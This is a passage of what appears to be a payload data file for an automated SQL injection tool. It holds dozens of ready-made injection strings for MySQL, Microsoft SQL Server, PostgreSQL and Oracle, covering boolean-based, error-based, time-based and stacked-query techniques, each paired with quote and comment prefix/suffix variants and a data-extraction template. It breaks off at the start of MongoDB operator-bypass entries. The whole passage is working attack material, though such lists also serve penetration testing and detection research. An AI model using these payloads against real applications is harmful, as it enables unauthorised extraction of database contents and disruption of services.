                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)",
                "vector": "OR EXP(~(SELECT*FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)e)x))",
                "dbms": "MySQL",
            },
            {
                "payload": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)",
                "vector": "AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)",
                "vector": "OR GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44),1337)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)",
                "vector": "AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
                "dbms": "MySQL",
            },
            {
                "payload": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)) USING utf8)))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)",
                "vector": "OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)) USING utf8)))",
                "dbms": "MySQL",
            },
            {
                "payload": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)",
                "vector": "AND (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44)x)y)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)",
                "vector": "OR (SELECT(x*1E308)FROM(SELECT CONCAT_WS(0x28,0x496e6a65637465647e,[INFERENCE],0x7e454e44)x)y)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                "vector": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE or HAVING clause (FLOOR)",
                "vector": "OR (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "dbms": "MySQL",
            },
            {
                "payload": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                "vector": "AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "dbms": "MySQL",
            },
            {
                "payload": "OR (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "MySQL >= 5.5 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
                "vector": "OR (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,[INFERENCE],FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
                "dbms": "MySQL",
            },
        ],
    },
    "Microsoft SQL Server": {
        "boolean-based": [
            {
                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace",
                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "dbms": "Microsoft SQL Server",
            },
            {
                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)",
                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))",
                "dbms": "Microsoft SQL Server",
            },
        ],
        "stacked-queries": [
            {
                "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": ""},
                    {"pref": '";', "suf": ""},
                    {"pref": ");", "suf": ""},
                    {"pref": "');", "suf": ""},
                    {"pref": '");', "suf": ""},
                ],
                "title": "Microsoft SQL Server/Sybase stacked queries",
                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "dbms": "Microsoft SQL Server",
            },
            {
                "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "comments": [
                    {"pref": ";", "suf": "--"},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "Microsoft SQL Server/Sybase stacked queries (comment)",
                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "dbms": "Microsoft SQL Server",
            },
        ],
        "time-based": [
            {
                "payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "Microsoft SQL Server/Sybase time-based blind (IF)",
                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "dbms": "Microsoft SQL Server",
            },
            {
                "payload": "IF(5689=5689) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "Microsoft SQL Server/Sybase time-based blind (IF - comment)",
                "vector": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
                "dbms": "Microsoft SQL Server",
            },
        ],
        "error-based": [
            {
                "payload": "AND 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause",
                "vector": "AND 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B[INFERENCE]%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
                "dbms": "Microsoft SQL Server",
            },
            {
                "payload": "OR 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B(SELECT (1337))%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause",
                "vector": "OR 3082=(SELECT (CHAR(114)%2BCHAR(48)%2BCHAR(111)%2BCHAR(116)%2BCHAR(104)%2BCHAR(51)%2BCHAR(120)%2BCHAR(52)%2BCHAR(57)%2BCHAR(126)%2B[INFERENCE]%2BCHAR(126)%2BCHAR(69)%2BCHAR(78)%2BCHAR(68)))",
                "dbms": "Microsoft SQL Server",
            },
        ],
    },
    "PostgreSQL": {
        "boolean-based": [
            {
                "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause",
                "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
                "dbms": "PostgreSQL",
            },
            {
                "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "PostgreSQL OR boolean-based blind - WHERE or HAVING clause",
                "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('4568' AS NUMERIC) END)) IS NULL",
                "dbms": "PostgreSQL",
            },
        ],
        "inline-query": [],
        "stacked-queries": [
            {
                "payload": "(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "PostgreSQL > 8.1 stacked queries",
                "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
                "dbms": "PostgreSQL",
            },
            {
                "payload": "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "PostgreSQL stacked queries (heavy query)",
                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE 1234 END))",
                "dbms": "PostgreSQL",
            },
        ],
        "time-based": [
            {
                "payload": "AND 4564=(SELECT 4564 FROM PG_SLEEP([SLEEPTIME]))",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "PostgreSQL > 8.1 AND time-based blind (comment)",
                "vector": "AND 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
                "dbms": "PostgreSQL",
            },
            {
                "payload": "OR 9756=(SELECT 9756 FROM PG_SLEEP([SLEEPTIME]))",
                "comments": [
                    {"pref": " ", "suf": ""},
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": ""},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": ""},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": ""},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": ""},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": ""},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "PostgreSQL > 8.1 OR time-based blind (comment)",
                "vector": "OR 4564=(CASE WHEN ([INFERENCE]) THEN (SELECT 4564 FROM PG_SLEEP([SLEEPTIME])) ELSE 4564 END)",
                "dbms": "PostgreSQL",
            },
        ],
        "error-based": [
            {
                "payload": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "PostgreSQL AND error-based - WHERE or HAVING clause",
                "vector": "AND 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
                "dbms": "PostgreSQL",
            },
            {
                "payload": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||1337::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "PostgreSQL OR error-based - WHERE or HAVING clause",
                "vector": "OR 9141=CAST(((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)))||[INFERENCE]::text||(CHR(126)||CHR(69)||CHR(78)||CHR(68)) AS NUMERIC)",
                "dbms": "PostgreSQL",
            },
        ],
    },
    "Oracle": {
        "boolean-based": [
            {
                "payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
                "comments": [
                    {"pref": "", "suf": ""},
                ],
                "title": "Oracle boolean-based blind - Parameter replace",
                "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN 01234 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)",
                "dbms": "Oracle",
            },
            {
                "payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
                "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
                "dbms": "Oracle",
            },
            {
                "payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
                "comments": [
                    {"pref": " ", "suf": "--"},
                    {"pref": "' ", "suf": "--"},
                    {"pref": '" ', "suf": "--"},
                    {"pref": ") ", "suf": "--"},
                    {"pref": "') ", "suf": "--"},
                    {"pref": '") ', "suf": "--"},
                ],
                "title": "Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
                "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,0568) END) FROM DUAL) IS NULL",
                "dbms": "Oracle",
            },
        ],
        "inline-query": [],
        "stacked-queries": [
            {
                "payload": "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) FROM DUAL)",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
                "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('eSwd',[SLEEPTIME]) ELSE 5238 END)",
                "dbms": "Oracle",
            },
            {
                "payload": "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "Oracle stacked queries (DBMS_LOCK.SLEEP - comment)",
                "vector": "BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END",
                "dbms": "Oracle",
            },
            {
                "payload": "BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END",
                "comments": [
                    {"pref": ";", "suf": ""},
                    {"pref": "';", "suf": "--"},
                    {"pref": '";', "suf": "--"},
                    {"pref": ");", "suf": "--"},
                    {"pref": "');", "suf": "--"},
                    {"pref": '");', "suf": "--"},
                ],
                "title": "Oracle stacked queries (USER_LOCK.SLEEP - comment)",
                "vector": "BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END",
                "dbms": "Oracle",
            },
        ],
        "time-based": [
            {
                "payload": "DBMS_PIPE.RECEIVE_MESSAGE('IsjT',[SLEEPTIME])",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": " AND 8675=", "suf": ""},
                    {"pref": " OR 8675=", "suf": ""},
                    {"pref": "' ", "suf": ""},
                    {"pref": "'||", "suf": "||'"},
                    {"pref": "' AND 8675=", "suf": "--"},
                    {"pref": "' OR 8675=", "suf": "--"},
                    {"pref": '"||', "suf": '||"'},
                    {"pref": '" AND 8675=', "suf": "--"},
                    {"pref": '" OR 8675=', "suf": "--"},
                    {"pref": ") AND 8675=", "suf": "--"},
                    {"pref": ") OR 8675=", "suf": "--"},
                    {"pref": "') AND 8675=", "suf": "--"},
                    {"pref": "') OR 8675=", "suf": "--"},
                    {"pref": '") AND 8675=', "suf": "--"},
                    {"pref": '") OR 8675=', "suf": "--"},
                ],
                "title": "Oracle time-based blind (DBMS_PIPE.RECEIVE_MESSAGE - comment)",
                "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('IkdY',[SLEEPTIME]) ELSE 5689 END)",
                "dbms": "Oracle",
            },
            {
                "payload": "DBMS_LOCK.SLEEP([SLEEPTIME])",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": " AND 8675=", "suf": ""},
                    {"pref": " OR 8675=", "suf": ""},
                    {"pref": "' ", "suf": ""},
                    {"pref": "'||", "suf": "||'"},
                    {"pref": "' AND 8675=", "suf": "--"},
                    {"pref": "' OR 8675=", "suf": "--"},
                    {"pref": '"||', "suf": '||"'},
                    {"pref": '" AND 8675=', "suf": "--"},
                    {"pref": '" OR 8675=', "suf": "--"},
                    {"pref": ") AND 8675=", "suf": "--"},
                    {"pref": ") OR 8675=", "suf": "--"},
                    {"pref": "') AND 8675=", "suf": "--"},
                    {"pref": "') OR 8675=", "suf": "--"},
                    {"pref": '") AND 8675=', "suf": "--"},
                    {"pref": '") OR 8675=', "suf": "--"},
                ],
                "title": "Oracle time-based blind (DBMS_LOCK.SLEEP - comment)",
                "vector": "(CASE WHEN ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]) ELSE DBMS_LOCK.SLEEP(0) END)",
                "dbms": "Oracle",
            },
            {
                "payload": "USER_LOCK.SLEEP([SLEEPTIME])",
                "comments": [
                    {"pref": "", "suf": ""},
                    {"pref": " AND 8675=", "suf": ""},
                    {"pref": " OR 8675=", "suf": ""},
                    {"pref": "' ", "suf": ""},
                    {"pref": "'||", "suf": "||'"},
                    {"pref": "' AND 8675=", "suf": "--"},
                    {"pref": "' OR 8675=", "suf": "--"},
                    {"pref": '"||', "suf": '||"'},
                    {"pref": '" AND 8675=', "suf": "--"},
                    {"pref": '" OR 8675=', "suf": "--"},
                    {"pref": ") AND 8675=", "suf": "--"},
                    {"pref": ") OR 8675=", "suf": "--"},
                    {"pref": "') AND 8675=", "suf": "--"},
                    {"pref": "') OR 8675=", "suf": "--"},
                    {"pref": '") AND 8675=', "suf": "--"},
                    {"pref": '") OR 8675=', "suf": "--"},
                ],
                "title": "Oracle time-based blind (USER_LOCK.SLEEP - comment)",
                "vector": "(CASE WHEN ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]) ELSE USER_LOCK.SLEEP(0) END)",
                "dbms": "Oracle",
            },
        ],
        "error-based": [
            {
                "payload": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
                "vector": "AND 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
                "dbms": "Oracle",
            },
            {
                "payload": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126))))",
                "comments": [
                    {"pref": " ", "suf": "-- wXyW"},
                    {"pref": "' ", "suf": "-- wXyW"},
                    {"pref": '" ', "suf": "-- wXyW"},
                    {"pref": ") ", "suf": "-- wXyW"},
                    {"pref": "') ", "suf": "-- wXyW"},
                    {"pref": '") ', "suf": "-- wXyW"},
                ],
                "title": "Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)",
                "vector": "OR 5798=CTXSYS.DRITHSX.SN(5798,((CHR(114)||CHR(48)||CHR(111)||CHR(116)||CHR(104)||CHR(51)||CHR(120)||CHR(52)||CHR(57)||CHR(126)||[INFERENCE]||CHR(126)||CHR(69)||CHR(78)||CHR(68))))",
                "dbms": "Oracle",
            },
        ],
    },
    "MongoDB": {
    "boolean-based": [
        {
            "title": "MongoDB Boolean-based bypass with $ne",
            "vector": "[$ne]=1",
            "dbms": "MongoDB",
        },
        {
